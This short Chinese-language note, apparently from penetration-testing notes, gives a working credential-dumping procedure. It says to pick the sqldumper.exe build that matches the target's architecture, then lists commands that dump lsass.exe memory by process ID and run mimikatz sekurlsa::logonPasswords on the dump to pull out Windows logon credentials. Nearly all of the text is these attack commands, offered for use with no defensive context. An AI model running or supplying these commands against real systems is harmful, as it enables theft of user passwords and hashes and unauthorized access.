
注意：必须选择与目标系统对应的版本，x86/x64不可混用，否则无法成功dump。配套的dbghelp.dll可以不使用，会默认使用操作系统内的dbghelp.dll。

使用方法：
```
sqldumper.exe [lsass.exe pid] 0 0x0110

sqldumper.exe 548 0 0x0110

mimikatz.exe "log" "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit
```
